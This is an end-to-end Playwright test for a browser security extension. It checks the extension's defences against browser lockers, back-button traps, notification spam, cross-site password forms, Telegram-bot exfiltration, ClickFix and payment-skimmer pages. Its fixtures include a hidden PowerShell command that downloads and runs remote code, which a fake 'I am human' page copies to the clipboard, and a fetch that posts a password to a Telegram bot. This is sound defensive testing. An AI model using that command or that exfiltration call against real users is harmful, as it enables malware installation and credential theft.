#!/usr/bin/env node
// ── tools/e2e-page-protections.mjs ───────────────────────────────────────────────
// Real-Chromium test (4.6.0) for the new page-level protections — behaviour only a browser shows:
//   blockDialogSpam (browser-locker, 5.1.5: a sign → the red warning page): keyboard lock refused; fullscreen re-entry refused after the
//     user left fullscreen (video player excepted) — also when the page stops fullscreenchange in the window
//     capture phase (5.0.8, C47); "Leave site?" only after typing; back-button trap skipped
//     (to the previous website, or about:blank when there is none) — and nothing kept between pages;
//   blockNotificationPrompts: a prompt without a click is answered "default" and logged; with a click it is not;
//   warnPasswordForms: a password form to another site is held and the in-page dialog decides (Esc = nothing
//     sent, Continue = sent); a same-site form and a form without a password go straight through; form.submit()
//     is caught too;
//   blockExfilMessagingBots: a fetch to a Telegram bot from a page is blocked and the tab shows the red warning
//     with the channel; its "Go back" leaves the site (previous website, not the phishing site's own pages);
//   blockClickFix / warnPaymentSkimmer (5.0.7, C47): the red warning opens — also when the page registered a
//     window-capture listener that stops the scriptlet's event (the bridges listen on window, first).
// Test hosts are mapped to a local server (--host-resolver-rules); levels, messages, protection keys and the
// channel come from the extension's own modules.
//
// Usage:  node e2e-page-protections.mjs --extension ../3P-Matrix [--chromium <path>]
// Exit:   0 = all pass · 1 = a case failed · 2 = did not run (C38)
// ─────────────────────────────────────────────────────────────────────────────

import { createServer } from "node:http";
import { existsSync, readFileSync } from "node:fs";
import { resolve, join } from "node:path";
import { pathToFileURL } from "node:url";

// ── Settings (one place) ─────────────────────────────────────────────────────
const EXIT = Object.freeze({ OK: 0, FAILED: 1, DID_NOT_RUN: 2 });
const LOCAL_ADDRESS = "127.0.0.1";
const HOST_A = "shop-a.test";                       // the page under test (registered domain shop-a.test)
const HOST_B = "collector-b.test";                  // "another site" (registered domain collector-b.test)
const HOST_PREV = "previous-c.test";                // the website visited before the page under test
const SW_SETTLE_MS = 1500;                          // first rule/script apply after install
const APPLY_SETTLE_MS = 1500;                       // a level/protection change re-registers scripts
const HOLD_CHECK_MS = 1500;                         // a held form must NOT have navigated within this time
const NAV_TIMEOUT_MS = 10000;
const POLL_STEP_MS = 200;                            // 5.1.5: polling the tab address for the warning page
const PUSHED_ENTRIES = 5;                           // fake history entries the trap page adds without a click
const DIALOG_ENTRIES = 1;                            // a site's own dialog entry (cookie banner), added on load without a click (5.0.4)
const DIALOG_CLOSE = Object.freeze({ HISTORY: "history", NAVIGATION: "navigation" });   // the two ways a page steps back itself
const TELEGRAM_FETCH = "https://api.telegram.org/bot123:abc/sendMessage";   // a phishing kit's call (never sent)
const PASSWORD = "e2e-secret";
const CLICKFIX_PAYLOAD = "powershell -w hidden -nop -c \"iex (irm http://198.51.100.7/a)\"";   // a STRONG pattern
const FAKE_PIXEL_PATH = "/fbevents.js";             // Facebook Pixel loader name, served from a non-Facebook host
// Event names the MAIN-world scriptlets dispatch — read from the shipped files, never retyped here (C39a).
const SCRIPT_EVENT = Object.freeze({ CLICKFIX: ["security/scam-guard-page.js", "CLICKFIX_BLOCKED_EVENT"],
                                     SKIMMER:  ["security/sec-skimmer-warn.js", "SKIMMER_BLOCKED_EVENT"] });
const LOG_MARK = "[3PMCF]";

function arg(name) { const i = process.argv.indexOf(`--${name}`); return i === -1 ? null : process.argv[i + 1]; }
function didNotRun(msg) { console.error(`e2e-page-protections: DID NOT RUN — ${msg}`); process.exit(EXIT.DID_NOT_RUN); }
function sleep(ms) { return new Promise((r) => setTimeout(r, ms)); }

const ext = arg("extension");
if (!ext || !existsSync(join(ext, "manifest.json"))) didNotRun("missing or invalid --extension <folder>");
const EXT = resolve(ext);
let chromium, C, M, P, X;
try { ({ chromium } = await import("playwright")); } catch { didNotRun("the playwright package is not installed"); }
try {
  C = await import(pathToFileURL(join(EXT, "data/constants.js")).href);
  M = await import(pathToFileURL(join(EXT, "data/message-types.js")).href);
  P = await import(pathToFileURL(join(EXT, "data/protections.js")).href);
  X = await import(pathToFileURL(join(EXT, "data/exfil-channels.js")).href);
} catch (e) { didNotRun(`cannot import extension modules: ${e.message}`); }
function scriptConst([file, name]) {
  const m = readFileSync(join(EXT, file), "utf8").match(new RegExp(`const ${name} = '([^']+)'`));
  if (!m) didNotRun(`${name} not found in ${file}`);
  return m[1];
}
const EVENT = Object.freeze({ CLICKFIX: scriptConst(SCRIPT_EVENT.CLICKFIX), SKIMMER: scriptConst(SCRIPT_EVENT.SKIMMER) });
// A hostile page: stops the scriptlet's event in the window capture phase before anything later can see it.
const STOP_EVENT = (ev) => `addEventListener(${JSON.stringify(ev)}, (e) => e.stopImmediatePropagation(), true);`;

// ── Test pages (one server, routed by path; built once the port is known) ──
function buildPages(port) {
  const other = (path) => `http://${HOST_B}:${port}${path}`;
  return Object.freeze({
  "/plain": "<!doctype html><title>plain</title><p>plain page",
  "/locker": `<!doctype html><title>locker</title>
    <input id="t"><button id="fs">fullscreen</button><div id="player"><video src="/clip.mp4"></video><button id="vfs">video fs</button></div>
    <script>
      document.getElementById("fs").onclick = () => document.documentElement.requestFullscreen().then(() => window.__fs = "in", (e) => window.__fs = e.message);
      document.getElementById("vfs").onclick = () => document.getElementById("player").requestFullscreen().then(() => window.__vfs = "in", (e) => window.__vfs = e.message);
    </script>`,
  "/locker-hostile": `<!doctype html><title>locker</title><button id="fs">fullscreen</button>
    <script>
      addEventListener("fullscreenchange", (e) => e.stopImmediatePropagation(), true);   // hides "the user left fullscreen"
      document.getElementById("fs").onclick = () => document.documentElement.requestFullscreen().then(() => window.__fs = "in", (e) => window.__fs = e.message);
    </script>`,
  "/leave": `<!doctype html><title>leave</title><input id="t"><button id="b">click</button>
    <script>window.onbeforeunload = () => "Changes you made may not be saved";</script>`,
  // 5.1.5 — a fake "your computer is infected" page: "Leave site?" armed, then a dialog loop (a support-scam sign).
  "/support-scam": `<!doctype html><title>infected</title><button id="b">click</button>
    <script>window.onbeforeunload = () => "Do not leave";
      document.getElementById("b").onclick = () => { for (let i = 0; i < 5; i++) alert("Your computer is infected! Call now"); };</script>`,
  // 5.1.9 — GitHub's editor: one "discard changes?" confirm per click; a person clicks slower than the loop window.
  "/slow-dialogs": `<!doctype html><title>editor</title><button id="b">cancel</button>
    <script>document.getElementById("b").onclick = () => { confirm("Discard your changes?"); };</script>`,
  "/trap": `<!doctype html><title>trap</title><p>trap
    <script>for (let i = 0; i < ${PUSHED_ENTRIES}; i++) history.pushState({ i }, "", "#t" + i);
      addEventListener("popstate", () => history.pushState({}, "", "#again"));</script>`,
  // 5.0.4 — real site pattern (euroingro.com cookie banner): the dialog adds a history entry on load (no click) so
  // Back closes it; closing it with a click makes the PAGE step back to remove that entry. ?n = entries added,
  // ?via = history.back() or navigation.back().
  "/dialog": `<!doctype html><title>dialog</title><button id="close">close dialog</button>
    <script>const q = new URLSearchParams(location.search), n = +q.get("n");
      for (let i = 0; i < n; i++) history.pushState({ modal: i }, "");
      document.getElementById("close").onclick = () => q.get("via") === "${DIALOG_CLOSE.NAVIGATION}" ? navigation.back() : history.back();</script>`,
  // The page asks on load, by itself (no click) — page.evaluate() cannot test that: Playwright runs it as a click.
  "/notify": `<!doctype html><title>notify</title><button id="b">bell</button>
    <script>Notification.requestPermission().then((r) => window.__onLoad = r);
      document.getElementById("b").onclick = () => Notification.requestPermission().then((r) => window.__clicked = r);</script>`,
  "/form-other": `<!doctype html><title>login</title><form id="f" method="post" action="${other("/collect")}">
    <input name="u" value="me"><input id="pw" type="password" name="p"><button id="go">Sign in</button></form>`,
  // 5.1.5 (user report, Ziggo GO): a single-page app signs in with its own submit handler, which removes the form at
  // once, and re-renders right after the click. Its handler must run and nothing may be re-sent afterwards. Known
  // limit: the original error needs a SLOW answer from the service worker (asleep); in the lab it answers within a
  // millisecond, so the 5.1.3 code passes this case too — it guards the same-host pass-through, not the timing.
  "/form-spa": `<!doctype html><title>login</title><form id="f" action=""><input id="pw" type="password">
    <button id="go">Sign in</button></form><p id="state">start</p>
    <script>document.getElementById("f").addEventListener("submit", (e) => { e.preventDefault();
      window.handledAt = performance.now(); document.getElementById("f").remove();
      document.getElementById("state").textContent = "signed-in"; });
      document.getElementById("go").addEventListener("click", () => setTimeout(() => {   // re-render, as SPAs do
        const f = document.getElementById("f"); if (f) f.replaceWith(f.cloneNode(true)); }, 0));</script>`,
  "/form-same": `<!doctype html><title>login</title><form method="post" action="/done">
    <input id="pw" type="password" name="p"><button id="go">Sign in</button></form>`,
  "/form-nopw": `<!doctype html><title>search</title><form action="${other("/search")}"><input id="q" name="q"><button id="go">Search</button></form>`,
  "/form-programmatic": `<!doctype html><title>login</title><form id="f" method="post" action="${other("/collect")}">
    <input type="password" name="p" value="x"></form><button id="go">go</button>
    <script>document.getElementById("go").onclick = () => document.getElementById("f").submit();</script>`,
  "/clickfix": `<!doctype html><title>verify</title><button id="go">I am human</button>
    <script>document.getElementById("go").onclick = () => navigator.clipboard.writeText(${JSON.stringify(CLICKFIX_PAYLOAD)}).catch(() => {});</script>`,
  "/clickfix-hostile": `<!doctype html><title>verify</title><button id="go">I am human</button>
    <script>${STOP_EVENT(EVENT.CLICKFIX)}
      document.getElementById("go").onclick = () => navigator.clipboard.writeText(${JSON.stringify(CLICKFIX_PAYLOAD)}).catch(() => {});</script>`,
  "/checkout": `<!doctype html><title>checkout</title><script src="${other(FAKE_PIXEL_PATH)}"></script><p>pay`,
  "/checkout-hostile": `<!doctype html><title>checkout</title><script>${STOP_EVENT(EVENT.SKIMMER)}</script>
    <script src="${other(FAKE_PIXEL_PATH)}"></script><p>pay`,
  "/exfil": `<!doctype html><title>exfil</title><button id="go">send</button>
    <script>document.getElementById("go").onclick = () => fetch(${JSON.stringify(TELEGRAM_FETCH)}, { method: "POST", body: "pw=x" }).catch(() => {});</script>`
  });
}
let PAGES = {};
const server = createServer((req, res) => {
  const path = req.url.split(/[?#]/)[0];
  if (path === FAKE_PIXEL_PATH) { res.writeHead(200, { "content-type": "text/javascript" }); res.end("/* fake pixel */"); return; }
  res.writeHead(200, { "content-type": "text/html" });
  res.end(PAGES[path] || "<!doctype html><title>other</title><p>" + path);
});
await new Promise((r) => server.listen(0, LOCAL_ADDRESS, r));
const PORT = server.address().port;
PAGES = buildPages(PORT);
const url = (host, path) => `http://${host}:${PORT}${path}`;

let ctx = null, failed = 0;
function ok(name, cond, info) {
  if (!cond) failed++;
  console.log(`${cond ? "PASS" : "FAIL"} ${name}${cond ? "" : "  " + JSON.stringify(info)}`);
}

try {
  ctx = await chromium.launchPersistentContext("", {
    headless: false, executablePath: arg("chromium") || undefined,
    args: ["--headless=new", `--disable-extensions-except=${EXT}`, `--load-extension=${EXT}`,
           `--host-resolver-rules=MAP ${HOST_A} ${LOCAL_ADDRESS}, MAP ${HOST_B} ${LOCAL_ADDRESS}, MAP ${HOST_PREV} ${LOCAL_ADDRESS}`,
           // Keyboard lock and notifications exist only in secure contexts; the local test server is plain HTTP.
           `--unsafely-treat-insecure-origin-as-secure=${[HOST_A, HOST_B, HOST_PREV].map((h) => url(h, "")).join(",")}`]
  });
  let [sw] = ctx.serviceWorkers();
  if (!sw) sw = await ctx.waitForEvent("serviceworker");
  const extId = new URL(sw.url()).host;
  await sleep(SW_SETTLE_MS);
  const ctl = await ctx.newPage(); await ctl.goto(`chrome-extension://${extId}/ui/protections.html`);
  const send = (msg) => ctl.evaluate((m) => chrome.runtime.sendMessage(m), msg);
  // The ordinary site warning would interrupt these flows (test hosts score as unknown sites): off here.
  // 5.1.3: the suspicious-site warning has no switch of its own any more (part of Scam protection, which these
  // cases need); it stays on — opening a test page directly (no other site sent it) has not triggered it.
  await send({ type: M.MSG_SET_LEVEL, level: C.LEVEL.SMART });
  await sleep(APPLY_SETTLE_MS);

  async function open(host, path) {
    const pg = await ctx.newPage();
    pg.logs = [];
    pg.on("console", (m) => pg.logs.push(m.text()));
    await pg.goto(url(host, path));
    return pg;
  }

  // 5.1.5 (owner): a support-scam sign sends the tab to the red warning page (reason browserLocker).
  const LOCKER_REASON = (await import(pathToFileURL(join(EXT, "data/page-scam-reasons.js")).href)).PAGE_SCAM_KIND.BROWSER_LOCKER;
  async function lockerWarned(p) {
    for (let t = 0; t < NAV_TIMEOUT_MS; t += POLL_STEP_MS) {
      try { const u = new URL(p.url()); if (u.pathname.endsWith(C.WARNING_PAGE.split("/").pop()) && u.searchParams.get(C.WARNING_REASON_PARAM) === LOCKER_REASON) return true; }
      catch { /* not yet */ }
      await sleep(POLL_STEP_MS);
    }
    return false;
  }

  // ── blockDialogSpam: keyboard lock ──
  let pg = await open(HOST_A, "/locker");
  const kl = await pg.evaluate(() => navigator.keyboard.lock().then(() => "locked", (e) => e.message));
  ok("browser-locker: keyboard lock refused by 3P Matrix", /3P Matrix/.test(kl), kl);
  ok("5.1.5: …and the page goes to the red warning page (support-scam sign)", await lockerWarned(pg), pg.url());
  await pg.close();

  // ── blockDialogSpam: fullscreen re-entry ──
  // Enter, leave, enter again; returns [first, again] — the page's own result strings.
  async function fullscreenTwice(p) {
    await p.click("#fs"); await p.waitForFunction(() => window.__fs, null, { timeout: NAV_TIMEOUT_MS });
    const first = await p.evaluate(() => window.__fs);
    await p.evaluate(() => document.exitFullscreen());
    await p.waitForFunction(() => !document.fullscreenElement);
    await p.evaluate(() => { window.__fs = undefined; });
    await p.click("#fs");
    // 5.1.5: the refusal is a support-scam sign — the tab may already be on the warning page (LEFT_PAGE) before the
    // page's own result can be read.
    const again = await p.waitForFunction(() => window.__fs, null, { timeout: NAV_TIMEOUT_MS })
      .then(() => p.evaluate(() => window.__fs)).catch(() => LEFT_PAGE);
    return [first, again];
  }
  const LEFT_PAGE = "(left for the warning page)";
  const refusedOrLeft = (r) => /3P Matrix/.test(r) || r === LEFT_PAGE;
  pg = await open(HOST_A, "/locker");                                      // a video player first: always allowed
  await pg.click("#vfs"); await pg.waitForFunction(() => window.__vfs, null, { timeout: NAV_TIMEOUT_MS });
  ok("browser-locker: a video player may still go fullscreen", (await pg.evaluate(() => window.__vfs)) === "in", await pg.evaluate(() => window.__vfs));
  await pg.close();
  pg = await open(HOST_A, "/locker");
  const [first, again] = await fullscreenTwice(pg);
  ok("browser-locker: fullscreen allowed the first time", first === "in", first);
  ok("browser-locker: fullscreen re-entry after leaving it is refused", refusedOrLeft(again), again);
  ok("5.1.5: …and the page goes to the red warning page", await lockerWarned(pg), pg.url());
  await pg.close();
  {
    const hp = await open(HOST_A, "/locker-hostile");
    const [, hostileAgain] = await fullscreenTwice(hp);
    ok("browser-locker: re-entry refused even when the page stops fullscreenchange (C47)", refusedOrLeft(hostileAgain), hostileAgain);
    await hp.close();
  }

  // ── 5.1.5: a support-scam page with "Leave site?" armed and a dialog loop ──
  {
    const sp = await open(HOST_A, "/support-scam");
    let prompted = false;
    sp.on("dialog", (d) => { if (d.type() === "beforeunload") prompted = true; d.dismiss().catch(() => {}); });
    await sp.click("#b");                                                  // sticky activation + the dialog loop
    ok("5.1.5: a dialog loop sends the page to the warning page, its \"Leave site?\" does not stop it",
       (await lockerWarned(sp)) && !prompted, { url: sp.url(), prompted });
    await sp.close();
  }

  // ── 5.1.9: dialogs spread over time (a person clicking Cancel) are not a loop ──
  {
    const SLOW_CLICK_GAP_MS = 700;                    // 3 clicks span 1.4 s > the page's 1 s loop window
    const SLOW_CLICKS = 3;
    const sd = await open(HOST_A, "/slow-dialogs");
    for (let i = 0; i < SLOW_CLICKS; i++) { await sd.click("#b"); await sleep(SLOW_CLICK_GAP_MS); }
    await sleep(SLOW_CLICK_GAP_MS);
    ok("5.1.9: three dialogs a person clicks over time stay on the page (no warning page)",
       sd.url() === url(HOST_A, "/slow-dialogs"), sd.url());
    await sd.close();
  }

  // ── blockDialogSpam: "Leave site?" on an ordinary page (5.1.5: untouched until a scam sign) ──
  async function leavePrompted(type) {
    const p = await open(HOST_A, "/leave");
    await p.click("#b");                                                   // sticky activation, as on a scam page
    if (type) await p.type("#t", "unsaved");
    let prompted = false;
    p.on("dialog", (d) => { prompted = d.type() === "beforeunload"; d.accept().catch(() => {}); });
    await p.close({ runBeforeUnload: true });
    await sleep(APPLY_SETTLE_MS);
    return prompted;
  }
  // 5.1.3: blockRedirectsDialogs sandboxes FRAMES only — before, the top page was sandboxed too (without allow-modals),
  // which made Chrome suppress every "Leave site?" prompt from level 3 outside safer regions. These cases run at
  // level 3 (the test hosts are outside safer regions), where the frames block is on: the site's own prompt survives.
  ok("5.1.5: an ordinary page keeps its own \"Leave site?\" (no scam sign), typed or not", await leavePrompted(false));
  ok("level 3 (frames sandboxed): \"Leave site?\" still shown after typing (unsaved changes)", await leavePrompted(true));

  // ── blockDialogSpam: back-button trap ──
  pg = await open(HOST_PREV, "/plain");
  await pg.goto(url(HOST_A, "/trap"));
  await pg.goBack().catch(() => {});
  await pg.waitForURL((u) => u.host.startsWith(HOST_PREV), { timeout: NAV_TIMEOUT_MS }).catch(() => {});
  ok("browser-locker: one Back press leaves the trap page to the previous website", new URL(pg.url()).host.startsWith(HOST_PREV), pg.url());
  await pg.close();
  pg = await open(HOST_A, "/trap");                                         // no earlier entry in this tab
  await pg.goBack().catch(() => {});
  await pg.waitForURL((u) => u.href === "about:blank", { timeout: NAV_TIMEOUT_MS }).catch(() => {});
  ok("browser-locker: trap with nothing before it → about:blank", pg.url() === "about:blank", pg.url());
  await pg.close();
  pg = await open(HOST_A, "/plain");
  await pg.evaluate(() => { history.pushState({}, "", "#a"); });
  await pg.goto(url(HOST_B, "/plain"));
  await pg.goBack();
  ok("browser-locker: nothing carried to the next page (normal Back works)", new URL(pg.url()).host.startsWith(HOST_A), pg.url());
  await pg.close();

  // 5.0.4 — the PAGE stepping back (closing its own dialog) is not the user's Back press: stay on the page.
  async function closeDialog(n, via) {
    const p = await open(HOST_PREV, "/plain");
    await p.goto(url(HOST_A, `/dialog?n=${n}&via=${via}`));
    await p.click("#close"); await sleep(HOLD_CHECK_MS);
    return p;
  }
  for (const via of Object.values(DIALOG_CLOSE)) {
    pg = await closeDialog(DIALOG_ENTRIES, via);
    ok(`browser-locker: a page closing its own dialog (${via}.back) stays on the page`, new URL(pg.url()).host.startsWith(HOST_A), pg.url());
    await pg.goBack().catch(() => {});
    await pg.waitForURL((u) => u.host.startsWith(HOST_PREV), { timeout: NAV_TIMEOUT_MS }).catch(() => {});
    ok(`browser-locker: after that (${via}.back), one Back press goes to the previous website`, new URL(pg.url()).host.startsWith(HOST_PREV), pg.url());
    await pg.close();
  }
  pg = await closeDialog(PUSHED_ENTRIES, DIALOG_CLOSE.HISTORY);   // a trap that removes one entry itself is still a trap
  ok("browser-locker: a trap page stepping back once itself stays on the page", new URL(pg.url()).host.startsWith(HOST_A), pg.url());
  await pg.goBack().catch(() => {});
  await pg.waitForURL((u) => u.host.startsWith(HOST_PREV), { timeout: NAV_TIMEOUT_MS }).catch(() => {});
  ok("browser-locker: …and the user's next Back press still skips the remaining entries", new URL(pg.url()).host.startsWith(HOST_PREV), pg.url());
  await pg.close();

  // ── Notification prompts without a click ──
  pg = await open(HOST_A, "/notify");
  await pg.waitForFunction(() => window.__onLoad, null, { timeout: NAV_TIMEOUT_MS }).catch(() => {});
  const noClick = await pg.evaluate(() => window.__onLoad);
  ok("notifications: a prompt without a click is answered \"default\" by 3P Matrix",
     noClick === "default" && pg.logs.some((t) => t.includes(LOG_MARK) && /notification prompt/.test(t)), { noClick, logs: pg.logs });
  const before = pg.logs.length;
  await pg.click("#b"); await sleep(APPLY_SETTLE_MS);
  ok("notifications: after a click the request is passed to Chrome", !pg.logs.slice(before).some((t) => /notification prompt/.test(t)), pg.logs.slice(before));
  await pg.close();

  // ── Password-form warning ──
  pg = await open(HOST_A, "/form-other");
  await pg.fill("#pw", PASSWORD);
  await pg.click("#go");
  await sleep(HOLD_CHECK_MS);
  ok("password form: to another site → held (not sent)", new URL(pg.url()).host.startsWith(HOST_A), pg.url());
  await pg.keyboard.press("Escape"); await sleep(HOLD_CHECK_MS);
  ok("password form: Esc closes the warning, nothing sent", new URL(pg.url()).host.startsWith(HOST_A), pg.url());
  await pg.click("#go"); await sleep(HOLD_CHECK_MS);
  await pg.keyboard.press("Tab"); await pg.keyboard.press("Enter");      // focus starts on Go back; Tab → Continue
  await pg.waitForURL((u) => u.host.startsWith(HOST_B), { timeout: NAV_TIMEOUT_MS }).catch(() => {});
  ok("password form: Continue sends it", new URL(pg.url()).host.startsWith(HOST_B), pg.url());
  await pg.close();
  pg = await open(HOST_A, "/form-same");
  await pg.fill("#pw", PASSWORD); await pg.click("#go");
  await pg.waitForURL((u) => u.pathname === "/done", { timeout: NAV_TIMEOUT_MS }).catch(() => {});
  ok("password form: same site → sent at once", new URL(pg.url()).pathname === "/done", pg.url());
  await pg.close();
  pg = await open(HOST_A, "/form-spa");
  const errors = [];
  pg.on("console", (m) => { if (/not connected/i.test(m.text())) errors.push(m.text()); });
  await pg.fill("#pw", PASSWORD); await pg.click("#go");
  await sleep(HOLD_CHECK_MS);
  ok("5.1.5: a single-page app's own sign-in handler runs and removes its form — no 'form is not connected' error",
     (await pg.textContent("#state")) === "signed-in" && errors.length === 0, { state: await pg.textContent("#state"), errors });
  await pg.close();
  pg = await open(HOST_A, "/form-nopw");
  await pg.fill("#q", "x"); await pg.click("#go");
  await pg.waitForURL((u) => u.host.startsWith(HOST_B), { timeout: NAV_TIMEOUT_MS }).catch(() => {});
  ok("password form: a form without a password field is never touched", new URL(pg.url()).host.startsWith(HOST_B), pg.url());
  await pg.close();
  pg = await open(HOST_A, "/form-programmatic");
  await pg.click("#go"); await sleep(HOLD_CHECK_MS);
  ok("password form: form.submit() by a script is caught too", new URL(pg.url()).host.startsWith(HOST_A), pg.url());
  await pg.close();

  // ── Exfiltration to a messaging bot ──
  const [telegram] = X.EXFIL_CHANNELS.filter((c) => c.group === X.EXFIL_GROUP.MESSAGING_BOTS);
  pg = await open(HOST_PREV, "/plain");
  await pg.goto(url(HOST_A, "/exfil"));
  await pg.goto(url(HOST_A, "/exfil?step=2"));                              // a two-step kit: same site twice
  await pg.click("#go");
  await pg.waitForURL((u) => u.protocol === "chrome-extension:", { timeout: NAV_TIMEOUT_MS }).catch(() => {});
  const w = new URL(pg.url());
  ok("exfiltration: the tab shows the warning for the channel",
     w.pathname.endsWith(C.WARNING_PAGE.split("/").pop()) && w.searchParams.get(C.WARNING_REASON_PARAM) === telegram.id, pg.url());
  const signal = await pg.locator("#warnSignals li").first().textContent().catch(() => "");
  ok("exfiltration: the warning names the channel", signal.includes(telegram.label), signal);
  await pg.click("#btnBack");
  await pg.waitForURL((u) => u.host.startsWith(HOST_PREV), { timeout: NAV_TIMEOUT_MS * 2 }).catch(() => {});
  ok("exfiltration: Go back skips the phishing site's own pages", new URL(pg.url()).host.startsWith(HOST_PREV), pg.url());
  await pg.close();

  // ── Page-scam warnings: ClickFix and payment skimmer (5.0.7, C47) ──
  // Each twice: an ordinary scam page, and one that stops the scriptlet's event in the window capture phase.
  const PS = await import(pathToFileURL(join(EXT, "data/page-scam-reasons.js")).href);
  async function scamWarning(path, click) {
    const p = await open(HOST_A, path);
    if (click) await p.click("#go").catch(() => {});
    await p.waitForURL((u) => u.protocol === "chrome-extension:", { timeout: NAV_TIMEOUT_MS }).catch(() => {});
    const u = new URL(p.url());
    await p.close();
    return u.pathname.endsWith(C.WARNING_PAGE.split("/").pop()) ? u.searchParams.get(C.WARNING_REASON_PARAM) : null;
  }
  for (const [what, path, kind, click] of [
    ["ClickFix", "/clickfix", PS.PAGE_SCAM_KIND.CLICK_FIX, true],
    ["ClickFix, page stops the event", "/clickfix-hostile", PS.PAGE_SCAM_KIND.CLICK_FIX, true],
    ["payment skimmer", "/checkout", PS.PAGE_SCAM_KIND.PAYMENT_SKIMMER, false],
    ["payment skimmer, page stops the event", "/checkout-hostile", PS.PAGE_SCAM_KIND.PAYMENT_SKIMMER, false]
  ]) {
    const reason = await scamWarning(path, click);
    ok(`page scam: ${what} → red warning`, reason === kind, reason);
  }

  await send({ type: M.MSG_RESET_SETTINGS });
} catch (e) {
  didNotRun(e && e.message || String(e));
} finally {
  if (ctx) await ctx.close().catch(() => {});
  server.close();
}

console.log(failed ? `e2e-page-protections: ${failed} FAILED` : "e2e-page-protections: ALL PASS");
process.exit(failed ? EXIT.FAILED : EXIT.OK);
